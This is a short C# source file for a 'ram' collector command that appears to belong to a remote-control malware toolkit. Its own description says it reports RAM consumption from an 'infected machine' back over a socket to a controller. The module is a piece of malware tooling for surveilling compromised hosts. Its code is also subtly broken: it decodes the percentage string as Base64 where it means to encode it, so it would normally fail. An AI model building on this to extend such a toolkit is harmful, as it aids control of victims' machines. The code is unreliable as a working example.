using Common.Attributes;
using System;
using System.Linq;
using System.Management;
using System.Net.Sockets;
using System.Runtime.Serialization;

namespace Common.Commands.Collector_Commands
{
    [Serializable]
    [CommandName("ram")]
    public class Ram_Command : Collector
    {
        public void Execute(Socket sendTo)
        {
            try
            {
                double percent = 0.0;
                var wmiObject = new ManagementObjectSearcher("select * from Win32_OperatingSystem");

                var memoryValues = wmiObject.Get().Cast<ManagementObject>().Select(mo => new
                {
                    FreePhysicalMemory = Double.Parse(mo["FreePhysicalMemory"].ToString()),
                    TotalVisibleMemorySize = Double.Parse(mo["TotalVisibleMemorySize"].ToString())
                }).FirstOrDefault();

                if (memoryValues != null)
                {
                    percent = ((memoryValues.TotalVisibleMemorySize - memoryValues.FreePhysicalMemory) / memoryValues.TotalVisibleMemorySize) * 100;
                }

                sendTo.Send(System.Convert.FromBase64String(String.Format("{0}", percent)));
            }
            catch(Exception ex)
            {
                Console.WriteLine("Error occured while executing RAM command!\n{0}", ex.ToString());
            }
        }

        public void PrintDescription()
        {
            Console.WriteLine("This plugin will return the RAM consumption on infected machine");
        }
    }
}
